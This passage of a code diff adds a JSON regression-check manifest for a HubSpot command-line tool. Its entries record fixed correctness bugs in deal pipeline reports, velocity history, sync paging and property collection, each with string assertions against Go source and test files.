+     "contains": "func TestR3DataEngagementsLiveWalksEveryAssociationPage(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataEngagementsLiveFailsOnAnyReadFailure(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataEngagementsLivePagingCapFails(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataEngagementsUnknownTypeRefused(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-pipeline-health-open-figures-use-deal-state-predicate",
+   "class": "wrong-result",
+   "summary": "pipeline-health reads deal state through the one predicate, dealClosedSQL (hs_is_closed, hs_is_closed_won, a closedwon/closedlost id, or a stage the stored pipeline marks isClosed; any closed signal wins). count and total_amount stay per stage and include closed deals, labeled by stage_is_closed; every open figure (open_count, open_amount, at_risk_amount, oldest_idle_days) counts only deals the predicate calls open, so a closed deal is never money at risk and never the oldest stuck deal. Swept: every hand-written deal query that counts, sums or lists open deals (owner-load, deals unowned, deals top, deals forecast, stale deals, nurture-mine, deals velocity) already uses dealClosedSQL; contacts win-back uses dealWonSQL.",
+   "why": "2026-10-24 Codex review round 1 P1: with the documented PipelineStage {\"id\":\"closedlost\",\"metadata\":{\"isClosed\":\"true\",\"probability\":\"0.0\"}} and an unarchived deal pipeline:\"default\", dealstage:\"closedlost\", amount:\"100000\", notes_last_contacted:\"2026-01-01T00:00:00Z\", `pipeline-health default --idle-days 14 --json` reported at_risk_amount 100000: the per-stage query filtered by stage only and never asked whether the deal was closed (tools-manifest.json:4540 pipelines, :1638 deals). Test: TestR3PipelineHealthClosedDealsAreNeverOpenAtRisk (closedlost, a custom isClosed stage, and hs_is_closed on a deal in an open stage).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "CASE WHEN ` + dealClosedSQL(\"\") + ` THEN 0 ELSE 1 END AS is_open",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "COALESCE(SUM(CASE WHEN is_open = 1 THEN amount END), 0)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "COALESCE(SUM(CASE WHEN is_open = 1 AND idle_days >= ?3 THEN amount END), 0)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "COALESCE(MAX(CASE WHEN is_open = 1 THEN idle_days END), 0)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "StageIsClosed:  st.IsClosed,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "not_contains": "THEN CAST(json_extract(data, '$.properties.amount') AS REAL) ELSE 0 END), 0)"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_state_test.go",
+     "contains": "func TestR3PipelineHealthClosedDealsAreNeverOpenAtRisk(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-velocity-history-must-describe-current-stage",
+   "class": "wrong-result",
+   "summary": "deals velocity dates a deal's entry into its CURRENT stage only from history that describes that stage: every dealstage history row at the deal's latest parseable instant (chronological, via hsJulianSQL) must carry the deal's current dealstage. When any names another stage (the stage changed after the last --with-history sync, or one instant holds two stages) or the deal has no parseable history, its time in stage is unknown: it is left out of deals and of the per-stage median/p90 stage_stats, listed under skipped with reason stale_history or no_history (skipped_count and skipped_by_reason cover the whole population; --limit trims only the list), and a stderr warning names 'hubspot-cli sync --resources hubspot-deals-crm --with-history dealstage'. Checked and left alone: meetings status-report and ever-had report history as history (ever-had hits) and read current_outcome from the current meeting row, not from history. The history must also postdate the deal's last change: its newest snapshot (snapshot_at: the hs_lastmodifieddate, else updatedAt, HubSpot reported on the record the history came with, never the time the row was written) must be no earlier than the deal's current hs_lastmodifieddate, else a deal that left the stage and came back after the capture is skipped as stale_history (a deal with no hs_lastmodifieddate too). A history row an older build wrote has no snapshot_at and proves nothing (stale_history); the column is added by migrateExtras and a read-only open that lacks it migrates first.",
+   "why": "2026-10-24 Codex review round 1 P1: sync deal 1 with dealstage qualifiedtobuy and a January 1 history entry using --with-history dealstage, then move it to presentationscheduled and sync without history; `deals velocity --json` gave presentationscheduled the January entry date and inflated dwell times, because the join took the latest history row without checking its value against the current stage (tools-manifest.json:1638-1705 propertiesWithHistory). Test: TestR3DealsVelocityStaleHistoryIsNotTheCurrentStage. Next-batch Codex round 1 (2026-10-27) P1: history captured August 1 at qualifiedtobuy, the deal moved away October 1 and back October 20 (PATCH /crm/v3/objects/0-3, tools-manifest.json:1682); the matching stage alone accepted the August entry. Test: TestNBVelocityHistoryMustPostdateTheDealsLastChange. Next-batch Codex round 2 (2026-10-27) P1: persist time is not snapshot time; a history response snapshotted at 12:00:00, a stage change and change back at 12:00:01-02, and the write at 12:00:03 made synced_at postdate the change, so the August entry was accepted (tools-manifest.json:1674, 1682). Test: TestNB2VelocityHistoryCarriesTheVendorSnapshotTime.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "LEFT JOIN hist n ON n.object_id = deal_id AND n.jd = h.entered_jd",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "COALESCE(SUM(CASE WHEN n.value <> deal_stage THEN 1 ELSE 0 END), 0) AS other_stage_rows",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "MIN(CASE WHEN n.value = deal_stage THEN n.ts END) AS entered_at",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "case otherStageRows > 0 || !entered.Valid || !capturedAfterChange:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "velocitySkipStaleHistory = \"stale_history\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "SkippedByReason map[string]int      `json:\"skipped_by_reason\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "if view.SkippedCount > 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "not_contains": "SELECT object_id, CAST(timestamp AS TEXT) AS entered_at, MAX("
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_state_test.go",
+     "contains": "func TestR3DealsVelocityStaleHistoryIsNotTheCurrentStage(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "(h.captured_jd IS NOT NULL AND modified_jd IS NOT NULL AND h.captured_jd >= modified_jd) AS captured_after_change",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_velocity_test.go",
+     "contains": "func TestNBVelocityHistoryMustPostdateTheDealsLastChange(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "MAX(` + hsJulianSQL(\"snapshot_at\") + `) AS captured_jd",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "not_contains": "hsJulianSQL(\"synced_at\")"
+    },
+    {
+     "file": "cli/internal/cli/sync_history.go",
+     "contains": "SnapshotAt: snapshotAt,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "\"snapshot_at\" TEXT,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "s.ensureColumn(ctx, conn, \"hubspot_property_history\", \"snapshot_at\", \"TEXT\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/novel_extras.go",
+     "contains": "source_id, synced_at, snapshot_at) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, NULLIF(?, ''))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_store_open.go",
+     "contains": "pragma_table_xinfo('hubspot_property_history') WHERE name = 'snapshot_at'",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb2_velocity_test.go",
+     "contains": "func TestNB2VelocityHistoryCarriesTheVendorSnapshotTime(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-pipeline-health-unlisted-stages-never-vanish",
+   "class": "wrong-result",
+   "summary": "Stored deal pipelines are a one-time fetch (this build's sync does not collect them), so a deal can sit in a stage the stored pipeline does not list. pipeline-health gives each such stage its own row (stage_listed false; closedwon/closedlost still labeled closed), names them in unlisted_stage_ids, and warns on stderr with the pipelines fetch command; its deals stay in count, total and, when open by the predicate, in the open and at-risk figures. A deal with no dealstage is matched as \"\" rather than dropped by a NULL compare. The no-pipelines and pipeline-not-found errors name the real fetch command (hsFetchDealPipelinesCmd) instead of a sync resource and a get-page command that do not exist.",
+   "why": "Round 3 sweep of pipeline_health.go: the per-stage loop iterated only the stored pipeline's stages, so an open deal in a stage added after the pipelines were fetched silently dropped out of at_risk_amount (an under-reported risk figure, from the documented PipelineStage list). The old hints told users to run 'sync --resources hubspot-pipelines-crm' (unknown sync resource) or 'hubspot-pipelines-crm get-page' (no such command). Test: TestR3PipelineHealthUnlistedStageDealsDoNotVanish.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "unlisted, err := pipelineHealthUnlistedStages(cmd, db, pipelineID, listed)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "AND COALESCE(json_extract(data, '$.properties.dealstage'), '') = ?2",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "\"unlisted_stage_ids\": unlisted,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "StageListed:    listed[st.StageID],",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "not_contains": "sync --resources hubspot-pipelines-crm"
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "not_contains": "hubspot-pipelines-crm get-page"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_state_test.go",
+     "contains": "func TestR3PipelineHealthUnlistedStageDealsDoNotVanish(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-pipeline-health-default-is-hubspot-default-pipeline",
+   "class": "wrong-result",
+   "summary": "'pipeline-health default' resolves HubSpot's own default deal pipeline (id \"default\") when it is stored; only when no pipeline has that id does it fall back to the first non-archived pipeline by id.",
+   "why": "Round 3 sweep of pipeline_health.go: 'default' took the first pipeline by id, and a custom numeric pipeline id such as \"12345\" sorts before \"default\", so the default pipeline's health was reported from a different pipeline. Test: TestR3PipelineHealthDefaultIsHubSpotsDefaultPipeline.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "if pipes[i].ID == \"default\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "not_contains": "WHERE COALESCE(archived, 0) = 0 ORDER BY id LIMIT 1"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_state_test.go",
+     "contains": "func TestR3PipelineHealthDefaultIsHubSpotsDefaultPipeline(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-deal-state-known",
+   "class": "wrong-result",
+   "summary": "Every report that keeps only open deals (pipeline-health, owner-load, deals unowned, deals velocity, stale deals, nurture-mine) first checks that each unarchived deal's open/closed state is known: hs_is_closed present, a default HubSpot stage id, or a stage a stored pipeline lists. Otherwise it refuses, naming the deals, their stages and the command that stores the pipelines. Weighted reports refuse the same way through dealStagePricer. pipeline-health prints an unknown stage probability as null/unknown, never 0.",
+   "why": "Codex round 1 (publish lane, 2026-10-24) class: an open-deal figure counted a closed deal. Sync requests neither the pipelines nor hs_is_closed, so a deal in a custom closed stage was counted as open by every report that filters open deals.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/hs_deal_known.go",
+     "contains": "func requireKnownDealStates(ctx context.Context, db *store.Store, command, pipeline string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/owner_load.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"owner-load\", pipeline)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_unowned.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"deals unowned\", pipeline)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"stale deals\", \"\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"nurture-mine\", \"\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"deals velocity\", pipeline)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "requireKnownDealStates(cmd.Context(), db, \"pipeline-health\", pipelineID)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "Probability    *float64 `json:\"probability\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_state_test.go",
+     "contains": "func TestR3OpenDealReportsRefuseUnknownDealState(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-descriptions-match-output",
+   "class": "docs",
+   "summary": "The pipeline-health and deals-velocity descriptions in root.go highlights, which.go and the MCP capability list (tools.go) state what the commands output (open $ at risk for deals idle past --idle-days, the oldest open deal's idle days, skipped stale history) instead of close-date risk and probability scoring they never did; --stage-under help says it excludes exactly that stage id.",
+   "why": "Codex round 1 and the fix helpers (publish lane, 2026-10-24): the generated descriptions claimed behavior the binary does not have.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "idle deals near their close date"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "idle deals near their close date"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "idle deals near their close date"
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "not_contains": "AT or PAST"
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "not_contains": "AT or PAST"
+    }
+   ]
+  },
+  {
+   "id": "sync-collects-deal-pipelines",
+   "class": "wrong-result",
+   "summary": "sync collects the deal pipelines (resource hubspot-pipelines-crm, GET /crm/v3/pipelines/deals, in the default resource set, written to the typed hubspot_pipelines_crm table in the store the command reads, --db included) and requests HubSpot's default deal properties plus hs_is_closed and hs_is_closed_won, so every synced deal's open/closed state is known. Every pipeline reader goes through the one shared reader hsPipelineRowsSQL (typed table plus pipelines a live read wrote through): stage probabilities and pipeline-health's lookup through hsStoredPipelines, the closed and listed stage predicates through the SQL. Every refusal names the remedy for both surfaces: 'hubspot-cli sync --resources hubspot-pipelines-crm,hubspot-deals-crm', or the MCP sync tool with the same resources. GET /crm/v3/pipelines/{objectType} returns every pipeline at once (CollectionResponsePipelineNoPaging), so a complete listing, from sync or a live list read, retires (undeclares) every stored pipeline of that object type it no longer returns (hsRetireUnlistedPipelines): a deleted pipeline never answers a deal reader, even when a new one takes its label.",
+   "why": "Codex and adversarial round 2 (publish lane, 2026-10-26) repeated the missing-local-data class: pipeline-health read only the typed table while the documented live read wrote the generic table, and no MCP tool could store pipelines, so the open-deal and weighted reports refused permanently over MCP and on --db stores.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"hubspot-pipelines-crm\": \"/crm/v3/pipelines/deals\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"hubspot-pipelines-crm\",",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_collected.go",
+     "contains": "\"hubspot-deals-crm\":     hsDealSyncProperties,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "const hsDealSyncProperties = \"dealname,amount,closedate,pipeline,dealstage,createdate,hs_lastmodifieddate,hs_object_id,hs_is_closed,hs_is_closed_won\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func hsStoredPipelines(db *store.Store) ([]storedPipeline, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "pipes, err := hsStoredPipelines(db)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "pipes, err := hsStoredPipelines(db)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "not_contains": "FROM hubspot_pipelines_crm"
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "const hsDealPipelinesSyncCmd = \"hubspot-cli sync --resources hubspot-pipelines-crm,hubspot-deals-crm\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "not_contains": "get-v3-pipelines-object-type-get-all deals"
+    },
+    {
+     "file": "cli/internal/cli/hs_twoclass_pipelines_test.go",
+     "contains": "func TestTwoclassFreshInstallWorksAfterTheDocumentedSync(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func hsRetireUnlistedPipelines(db *store.Store, resource, path string, items []json.RawMessage) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "_ = hsRetireUnlistedPipelines(db, resource, path, env.Results)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if err := hsRetireUnlistedPipelines(db, resource, path, items); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb3_reports_test.go",
+     "contains": "func TestNB3APipelineTheFullListingNoLongerHasNeverAnswersADealReport(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "pipeline-object-type-declared",
+   "class": "wrong-result",
+   "summary": "Every object type's pipelines share one stored resource (GET /crm/v3/pipelines/{objectType}, press/tools-manifest.json), so each stored pipeline's object type is recorded in hubspot_pipeline_object_types from the request path that fetched it: sync's /crm/v3/pipelines/deals (sync.go, after the batch upsert) and a live /crm/v3/pipelines/{objectType} list read (data_source.go, after writeThroughCache). The shared reader hsPipelineRowsSQL returns only rows declared deals (or 0-3); an undeclared row (a ticket pipeline, a write response, a stage) is never a deal pipeline. A store an older binary migrated takes the read-write-migrate path so the table exists.",
+   "why": "Codex extra delta round (2026-10-27) P1: after 'hubspot-pipelines-crm get-v3-pipelines-object-type-get-all tickets' on a store with deals but no deal pipelines, 'pipeline-health default' reported a ticket pipeline with zero deal activity instead of refusing. Test: TestNextfixDealReadersTakeOnlyDealPipelines.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if err := hsDeclarePipelineObjectType(db, resource, path, items); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "hsDeclareReadPipelines(ctx, resourceType, path, data)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "CREATE TABLE IF NOT EXISTS \"hubspot_pipeline_object_types\" (",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "const hsDealPipelineIDsSQL = `SELECT id FROM hubspot_pipeline_object_types WHERE object_type IN ('deals', '0-3')`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "IN (` + hsDealPipelineIDsSQL + `)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_store_open.go",
+     "contains": "name IN ('resources', 'hubspot_pipeline_object_types')",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nextfix_pipeline_type_test.go",
+     "contains": "func TestNextfixDealReadersTakeOnlyDealPipelines(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-paging-next-after",
+   "class": "wrong-result",
+   "summary": "Every HubSpot CRM list paged by 'after' answers \"paging\":{\"next\":{\"after\":...}} (CollectionResponse...ForwardPaging, press/tools-manifest.json), so sync (extractPageItemsWithPagination) and live --all reads (paginatedGet) take the next cursor from paging.next.after when the caller names no cursor path (hsNextCursorPath); the generic fallbacks still run when it is absent.",
+   "why": "Next-batch Codex round 1 (2026-10-27) P1: eleven deals, page one holding ten and paging.next.after 11, stopped sync after ten records; pipeline reports then published totals from a partial store (tools-manifest.json:1638). Tests: TestNBSyncReadsEveryHubSpotPage, TestNBLiveAllReadsEveryHubSpotPage.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "nextCursorPath = hsNextCursorPath(cursorParam, nextCursorPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "nextCursorPath = hsNextCursorPath(cursorParam, nextCursorPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_paging.go",
+     "contains": "func hsNextCursorPath(cursorParam, nextCursorPath string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_paging_test.go",
+     "contains": "func TestNBSyncReadsEveryHubSpotPage(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_paging_test.go",
+     "contains": "func TestNBLiveAllReadsEveryHubSpotPage(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-reports-read-only-collected-properties",
+   "class": "wrong-result",
+   "summary": "HubSpot returns only the properties a read names, or the object's defaults when it names none (press/tools-manifest.json, the properties parameter of /crm/v3/objects reads). Sync requests, per object, HubSpot's default set (never narrowed) plus every property a report reads (hsSyncProperties + hsReportProperties via hsCollectedProperties); a user --param properties= adds to that list and never narrows it; the live timeline (engagements of) requests the same list. A requested property with no value comes back null, so a stored record that LACKS one was never collected. hsRequireCollected checks EVERY property sync collects for the object (HubSpot's defaults included, since a projected live read stores a record without them) plus the --filter fields: every report that reads one (deals unowned, owner-load, stale contacts/deals, pipeline-health, deals top, nurture mine/queue, contacts win-back, contacts funnel, notes signals, meetings ever-had/status-report, since, engagements of local) refuses through hsRequireCollected and names 'hubspot-cli sync --resources <resource> --full' and the MCP sync tool. A --filter is held to the same rule: stale contacts/deals, deals top, nurture queue and meetings ever-had pass the filter's fields to the guard, and a field sync does not request by default is named in the remedy as --param properties=<field>. TestNBEveryReadPropertyIsCollected fails when any source reads a property no sync collects. Every report checks every object it reads, the objects it JOINs included: deals forecast, deals velocity, contacts win-back, nurture-mine and notes signals check the deals they read; a source scan (TestNB3EveryReportReadingStoredPropertiesRequiresThemCollected) fails any report file that reads a stored object's properties without checking that object, or reads a property sync does not collect.",
+   "why": "Next-batch Codex round 1 (2026-10-27) P1: the deal projection omitted hubspot_owner_id, so an open $10,000 deal owned by 7, synced into a fresh store, was reported by 'deals unowned' as unassigned exposure (tools-manifest.json:1668); contacts were synced with defaults only, so lifecyclestage, owner and last-touch reads were empty everywhere. Defaults and null-for-empty probed live (.review/nb-probe-props.txt, nb-probe-null.txt). Tests: TestNBSyncCollectsWhatReportsRead, TestNBLiveEngagementsReadTheirTitles, TestNBReportRefusesAnUncollectedProperty, TestNBEveryReadPropertyIsCollected, TestNBFilterOnAnUncollectedPropertyRefuses. Next-batch Codex round 2 (2026-10-27) P1: the guard checked only the non-default report properties; a projected by-id read (get-v3-objects-0-3-deal-id-get-by-id --properties without amount, tools-manifest.json:1624) stored the deal without amount and owner-load reported total_amount 0. Test: TestNB2ReportRefusesAnUncollectedDefaultProperty.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/hs_collected.go",
+     "contains": "func hsRequireCollected(ctx context.Context, db *store.Store, command, resource string, filterFields ...string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_collected.go",
+     "contains": "func hsCollectedProperties(resource, user string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if p := hsCollectedProperties(resource, params[\"properties\"]); p != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "map[string]string{\"properties\": hsCollectedProperties(strings.ReplaceAll(info.Table, \"_\", \"-\"), \"\")}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_unowned.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/owner_load.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pipeline_health.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_win_back.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_funnel.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "hsRequireCollected(cmd.Context(), db,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNBSyncCollectsWhatReportsRead(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNBLiveEngagementsReadTheirTitles(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNBReportRefusesAnUncollectedProperty(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNBEveryReadPropertyIsCollected(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "expr.FieldsReferenced()...)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "contains": "expr.FieldsReferenced()...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "expr.FieldsReferenced()...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"nurture queue\", \"hubspot-contacts-crm\", filterFields...)",
